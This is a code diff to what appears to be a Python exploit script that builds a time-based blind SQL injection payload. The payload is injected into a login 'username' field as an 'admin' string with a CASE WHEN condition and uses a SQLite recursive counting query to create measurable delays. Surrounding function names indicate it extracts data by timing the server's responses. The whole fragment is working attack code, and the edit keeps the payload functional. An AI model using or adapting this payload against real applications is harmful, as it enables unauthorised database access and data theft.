@@ -45,7 +45,7 @@ def check_payload_true(known_user, sql_payload, threshold):
 
 def build_sql_payload(condition):
     return {
-        f"username": "admin' AND (CASE WHEN ({condition}) THEN (SELECT sum(x) FROM (WITH RECURSIVE cnt(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM cnt WHERE x<{COUNTER_DELAY}) SELECT x FROM cnt)) ELSE 0 END) like '1"}
+        "username": "admin' AND (CASE WHEN (" + condition + ") THEN (SELECT sum(x) FROM (WITH RECURSIVE cnt(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM cnt WHERE x<" + COUNTER_DELAY.__str__() + ") SELECT x FROM cnt)) ELSE 0 END) like '1"}
 
 
 def measure_response_time(url, input):
